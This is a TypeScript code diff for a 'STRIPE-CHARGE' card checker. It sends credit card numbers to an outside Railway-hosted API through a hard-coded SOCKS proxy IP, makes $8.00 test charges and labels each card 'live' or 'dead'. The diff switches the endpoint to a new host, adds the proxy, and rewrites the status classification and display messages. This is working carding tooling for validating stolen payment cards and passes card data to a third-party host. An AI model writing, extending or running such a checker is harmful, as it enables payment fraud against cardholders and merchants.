@@ -114,61 +114,35 @@ const extractResponseMessage = (data: Record<string, unknown>): string => {
   return 'No response message';
 };
 
-// Determine status from API response
+// Determine status from API response based on full_response field
 const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
-  const rawResponse = JSON.stringify(data).toLowerCase();
-  const status = (data?.status as string)?.toLowerCase() || '';
-  const message = (data?.message as string)?.toLowerCase() || '';
+  console.log('[STRIPE-CHARGE] Analyzing response - full_response:', data?.full_response);
   
-  console.log('[STRIPE-CHARGE] Analyzing response - status:', status, 'message:', message);
-  
-  // UNKNOWN: Check for API/gateway errors first
-  if (
-    rawResponse.includes('iframe') ||
-    rawResponse.includes('step') ||
-    rawResponse.includes('timeout') ||
-    rawResponse.includes('not found') ||
-    rawResponse.includes('error') ||
-    rawResponse.includes('exception') ||
-    status === 'retry' ||
-    rawResponse.includes('retry')
-  ) {
-    console.log('[STRIPE-CHARGE] Detected API/Gateway error - marking as UNKNOWN');
+  // Check for error scenarios first
+  if (data?.error || data?.status === 'error') {
+    console.log('[STRIPE-CHARGE] Detected API error - marking as UNKNOWN');
     return "unknown";
   }
   
-  // LIVE: Check for success indicators
-  if (
-    status === 'success' ||
-    rawResponse.includes('success') ||
-    rawResponse.includes('successful transaction') ||
-    rawResponse.includes('successfully transaction') ||
-    rawResponse.includes('successfully charged') ||
-    rawResponse.includes('approved') ||
-    rawResponse.includes('charged')
-  ) {
-    console.log('[STRIPE-CHARGE] Detected LIVE status');
-    return "live";
+  // Primary logic: full_response = true means CHARGED (live), false means DECLINED (dead)
+  if (typeof data?.full_response === 'boolean') {
+    if (data.full_response === true) {
+      console.log('[STRIPE-CHARGE] full_response=true - CHARGED (LIVE)');
+      return "live";
+    } else {
+      console.log('[STRIPE-CHARGE] full_response=false - DECLINED (DEAD)');
+      return "dead";
+    }
   }
   
-  // DEAD: Check for declined, failed, rejected indicators
-  if (
-    status === 'declined' ||
-    status === 'failed' ||
-    status === 'rejected' ||
-    status === 'dead' ||
-    rawResponse.includes('declined') ||
-    rawResponse.includes('failed') ||
-    rawResponse.includes('rejected') ||
-    rawResponse.includes('verification') ||
-    rawResponse.includes('3d') ||
-    rawResponse.includes('otp') ||
-    rawResponse.includes('insufficient') ||
-    rawResponse.includes('invalid') ||
-    rawResponse.includes('expired') ||
-    rawResponse.includes('card was declined')
-  ) {
-    console.log('[STRIPE-CHARGE] Detected DECLINED status');
+  // Fallback: check string versions of full_response
+  const fullResponseStr = String(data?.full_response || '').toLowerCase();
+  if (fullResponseStr === 'true') {
+    console.log('[STRIPE-CHARGE] full_response="true" - CHARGED (LIVE)');
+    return "live";
+  }
+  if (fullResponseStr === 'false') {
+    console.log('[STRIPE-CHARGE] full_response="false" - DECLINED (DEAD)');
     return "dead";
   }
   
@@ -179,10 +153,10 @@ const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" |
 // Perform API check with retry logic
 const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
   const maxRetries = 2;
-  // API format: https://stripecharge.up.railway.app/{cc}
+  // New API format: http://web-production-7ad4f.up.railway.app/api?cc={cc}&proxy=138.197.124.55:9150&proxytype=sock5
   const timestamp = Date.now();
   const randomId = Math.random().toString(36).substring(2, 15);
-  const apiUrl = `https://stripecharge.up.railway.app/${encodeURIComponent(cc)}?_t=${timestamp}&_r=${randomId}`;
+  const apiUrl = `http://web-production-7ad4f.up.railway.app/api?cc=${encodeURIComponent(cc)}&proxy=138.197.124.55:9150&proxytype=sock5&_t=${timestamp}&_r=${randomId}`;
   
   console.log(`[STRIPE-CHARGE] Attempt ${attempt}/${maxRetries} - API call:`, apiUrl);
 
@@ -214,7 +188,16 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
 
     const computedStatus = getStatusFromResponse(data);
     const responseMessage = extractResponseMessage(data);
-    const apiMessage = data.message || 'No response message';
+    
+    // Build display message based on full_response
+    let apiMessage = '';
+    if (data?.full_response === true) {
+      apiMessage = 'CHARGED - $8.00';
+    } else if (data?.full_response === false) {
+      apiMessage = 'DECLINED';
+    } else {
+      apiMessage = data?.message as string || responseMessage || 'No response message';
+    }
 
     // Retry on UNKNOWN
     if (computedStatus === "unknown" && attempt < maxRetries) {
@@ -230,11 +213,12 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     return {
       computedStatus,
       responseMessage,
-      apiStatus: data.status || 'UNKNOWN',
-      apiMessage: data.message || responseMessage,
+      apiStatus: computedStatus === 'live' ? 'CHARGED' : computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN',
+      apiMessage,
       apiTotal: '$8.00',
       rawResponse: JSON.stringify(data),
       screenshotUrl,
+      fullResponse: data?.full_response,
     };
   } catch (error) {
     console.error(`[STRIPE-CHARGE] Attempt ${attempt} - Fetch error:`, error);
